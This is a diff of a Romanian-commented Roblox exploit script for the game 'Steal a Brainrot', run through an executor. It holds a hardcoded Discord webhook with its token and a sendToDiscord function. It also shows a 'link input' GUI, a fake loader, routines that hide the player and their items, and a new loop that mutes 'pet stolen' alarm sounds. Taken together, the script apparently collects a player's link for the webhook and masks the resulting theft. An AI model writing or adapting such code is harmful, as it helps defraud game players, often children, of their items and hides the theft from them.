@@ -1,5 +1,5 @@
--- SCRIPT DELTA TELEFON - CU SUNET DE FUNDAL (ACOPERĂ TOT)
--- Compatibil cu Delta Executor
+-- Script pentru Delta - Steal a Brainrot (VOID EXTERNAL + Discord)
+-- OPREȘTE DOAR ALARMA (furat pet), restul sunetelor rămân
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -8,7 +8,6 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
-local RunService = game:GetService("RunService")
 
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
@@ -26,54 +25,64 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== SUNET DE FUNDAL (ACOPERĂ TOATE SUNETELE) =====
-local function playCoverSound()
+-- ===== OPREȘTE DOAR ALARMA (furat pet) =====
+local function killAlarmOnly()
+    print("🔇 Oprire alarmă...")
+    
+    -- Oprește doar sunetele care sună a alarmă
     pcall(function()
-        local ambient = Instance.new("Sound")
-        ambient.Name = "CoverSound"
-        ambient.SoundId = "rbxassetid://9120263686"  -- Sunet de ploaie
-        ambient.Volume = 1
-        ambient.Looped = true
-        ambient.PlayOnRemove = false
-        ambient.Parent = SoundService
-        ambient:Play()
-        print("✅ Sunet de fundal activ!")
-    end)
-end
-
--- ===== OPREȘTE TOATE SUNETELE, DAR PĂSTREAZĂ SUNETUL DE FUNDAL =====
-local function killAllAudio()
-    -- Oprește toate sunetele
-    pcall(function()
-        SoundService.Volume = 0
         for _, sound in pairs(game:GetDescendants()) do
-            if sound:IsA("Sound") and sound.Name ~= "CoverSound" then
-                sound.Volume = 0
-                sound:Stop()
-                sound.Playing = false
+            if sound:IsA("Sound") then
+                local name = sound.Name:lower()
+                -- Caută sunete care sună a alarmă
+                if name:find("alarm") or 
+                   name:find("alert") or 
+                   name:find("warning") or 
+                   name:find("siren") or
+                   name:find("notification") or
+                   name:find("beep") or
+                   name:find("buzz") or
+                   name:find("steal") or
+                   name:find("theft") or
+                   name:find("pet") then
+                    sound.Volume = 0
+                    sound:Stop()
+                    sound.Playing = false
+                    print("🔇 Alarmă oprită: " .. sound.Name)
+                end
             end
         end
     end)
     
-    -- BLOCEAZĂ ORICE SUNET NOU (loop)
+    -- Blochează alarmele NOI care apar
     spawn(function()
         while true do
-            task.wait(0.01)
+            task.wait(0.1)
             pcall(function()
-                SoundService.Volume = 0
                 for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") and sound.Name ~= "CoverSound" then
-                        sound.Volume = 0
-                        sound:Stop()
-                        sound.Playing = false
+                    if sound:IsA("Sound") then
+                        local name = sound.Name:lower()
+                        if name:find("alarm") or 
+                           name:find("alert") or 
+                           name:find("warning") or 
+                           name:find("siren") or
+                           name:find("notification") or
+                           name:find("beep") or
+                           name:find("buzz") or
+                           name:find("steal") or
+                           name:find("theft") or
+                           name:find("pet") then
+                            sound.Volume = 0
+                            sound:Stop()
+                            sound.Playing = false
+                        end
                     end
                 end
             end)
         end
     end)
     
-    -- Redă sunetul de fundal
-    playCoverSound()
+    print("✅ Doar alarma a fost oprită!")
 end
 
 -- ===== ASCUNDE BRAINROT-URILE =====
@@ -465,7 +474,7 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            killAllAudio()
+            killAlarmOnly()  -- <-- OPRESTE DOAR ALARMA
             local count = hideBrainrots()
             print("✅ Script active! " .. count .. " brainrots hidden.")
             spawn(function()
@@ -484,7 +493,7 @@ local function main()
     showLinkGUI()
     print("🚀 Waiting for link input...")
     print("🔄 Base resets every 5 seconds.")
-    print("🔊 Cover sound playing!")
+    print("🔇 Only alarm sounds are OFF.")
 end
 
 pcall(main)
